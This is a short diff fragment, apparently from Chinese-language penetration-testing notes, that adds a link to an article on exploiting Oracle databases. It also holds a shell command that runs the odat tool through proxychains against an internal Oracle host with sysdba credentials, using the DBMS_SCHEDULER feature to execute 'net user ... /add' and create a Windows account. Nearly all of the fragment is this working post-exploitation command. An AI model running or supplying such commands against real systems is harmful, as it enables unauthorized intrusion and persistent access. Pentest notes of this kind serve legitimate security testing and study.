@@ -1,3 +1,5 @@
+[渗透过程中Oracle数据库的利用](https://mp.weixin.qq.com/s/T63BMS8Vt_RpXfPYpzOyHA)
+
 ```sh
 # 创建用户
 proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user dotast qwer1234! /add'
